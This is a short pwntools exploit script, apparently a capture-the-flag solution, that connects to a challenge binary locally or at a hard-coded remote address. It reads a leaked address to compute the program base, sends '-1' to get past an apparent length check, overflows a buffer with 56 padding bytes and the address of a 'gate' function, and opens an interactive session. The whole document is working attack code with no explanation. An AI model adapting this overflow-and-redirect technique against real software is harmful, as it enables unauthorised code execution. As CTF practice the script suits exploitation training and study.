from pwn import *

context.arch = 'amd64'
context.log_level = 'info'

path = './chall'
elf = ELF(path, checksec=False)
HOST, PORT = "134.112.58.12", 10011

p = remote(HOST, PORT) if args.REMOTE else process(path)
p.recvuntil(b"ABYSS: ")
leak = int(p.recvuntil(b" ", drop=True), 16)
base = leak - elf.symbols['main']      
gate = base + 0x1231
p.recvuntil(b"consume?")
p.sendline(b"-1")
p.recvuntil(b"Feast:")
p.send(b"A" * 56 + p64(gate))
p.interactive()